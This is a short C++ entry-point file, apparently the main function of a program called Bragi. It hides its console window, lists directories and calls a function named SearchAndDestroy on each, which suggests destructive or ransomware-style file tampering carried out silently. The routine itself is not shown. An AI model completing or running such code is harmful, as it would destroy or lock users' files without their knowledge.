#include "Bragi.h"
#include <iostream>

int main()
{
	// Hide Console
	FreeConsole();
#ifdef _WIN32
	// Support UTF-16 Encoding
	_setmode(_fileno(stdout), _O_U16TEXT);
#endif
	// This vector keeps all directories
	std::vector<std::wstring> directories;
	directories = ListDir(Path());
	// For each folder
	for (auto dir : directories)
	{
		// Move into this directory
		SearchAndDestroy(dir);
	}
	return EXIT_SUCCESS;
}